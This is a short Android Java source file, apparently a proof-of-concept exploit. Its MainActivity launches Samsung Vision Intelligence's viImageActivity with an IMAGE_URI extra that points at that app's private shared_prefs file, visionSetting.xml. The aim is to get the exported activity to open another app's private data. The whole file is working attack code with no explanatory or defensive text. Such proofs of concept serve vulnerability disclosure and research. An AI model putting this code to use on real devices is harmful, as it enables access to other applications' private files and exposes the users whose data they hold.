package poc.app;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent i = new Intent();
        i.setClassName("com.samsung.android.visionintelligence", "com.samsung.android.visionintelligence.viImageActivity");
        i.putExtra("IMAGE_URI", "file:///data/user/0/com.samsung.android.visionintelligence/shared_prefs/visionSetting.xml");
        startActivity(i);
    }
}